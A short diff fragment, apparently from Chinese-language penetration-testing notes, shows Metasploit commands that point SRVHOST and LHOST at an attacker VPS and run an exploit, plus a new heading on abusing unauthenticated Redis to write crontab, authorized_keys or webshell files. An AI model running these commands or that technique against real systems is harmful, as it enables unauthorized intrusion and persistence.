@@ -26,3 +26,5 @@ set SRVHOST VPS_IP
 set LHOST VPS_IP
 exploit
 ```
+
+# Redis 未授权写入 crontab/authorized_keys/webshell/
